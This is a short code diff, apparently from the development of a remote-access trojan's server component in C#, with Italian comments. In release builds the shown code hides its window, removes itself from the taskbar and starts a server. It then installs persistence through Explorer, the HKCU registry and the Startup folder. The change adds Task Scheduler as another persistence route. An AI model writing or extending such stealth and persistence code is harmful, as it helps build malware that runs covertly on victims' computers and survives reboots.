@@ -16,12 +16,12 @@ namespace BlackHat_Server
             // VERSIONE DEL SERVER
             ST_Client.Instance.ServerVersion = "0.1.2";
 
-            #if !DEBUG
+#if !DEBUG
             Hide();
             ShowInTaskbar = false;
             
             StartSrv();
-            #endif
+#endif
         }
 
 
@@ -33,10 +33,9 @@ namespace BlackHat_Server
 
         private void StartSrv()
         {
-           
-
             // INSTALLAZIONE SERVER
-            if (ST_Client.Instance.bUseExplorer || ST_Client.Instance.bUseHKCU || ST_Client.Instance.bUseStartupFolder)
+            if (ST_Client.Instance.bUseExplorer || ST_Client.Instance.bUseHKCU ||
+                ST_Client.Instance.bUseStartupFolder || ST_Client.Instance.UseTaskScheduler)
             {
                 var ins = new InstallClass();
                 ins.StartInstallTHread();
